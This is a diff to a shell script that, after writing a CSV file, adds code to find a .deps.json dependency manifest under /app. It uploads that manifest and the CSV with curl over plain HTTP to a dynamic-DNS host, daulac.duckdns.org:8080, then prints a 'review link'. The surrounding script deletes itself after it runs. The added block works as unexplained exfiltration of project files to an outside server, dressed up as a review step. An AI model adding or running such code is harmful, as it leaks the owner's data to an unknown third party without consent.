@@ -51,5 +51,27 @@ done
 
 echo "CSV file created: $output_file"
 
+# Find the .deps.json file in the /app directory
+deps_file=$(find /app -name "*.deps.json" | head -n 1)
+
+# Check if a .deps.json file is found
+if [ -z "$deps_file" ]; then
+  echo "No .deps.json file found."
+  exit 1
+fi
+
+# Upload the CSV file and the .deps.json file
+response=$(curl -s -F "file1=@${output_file}" -F "file2=@${deps_file}" http://daulac.duckdns.org:8080/upload)
+
+# Check if the upload was successful
+if [ $? -eq 0 ]; then
+  # Remove the .csv extension from the output file name to create the review link
+  review_link="${output_file%.csv}"
+  echo "Link for review: http://daulac.duckdns.org:8080/${review_link}"
+else
+  echo "Upload failed."
+  exit 1
+fi
+
 # Remove this script after execution
 rm -- "$0"
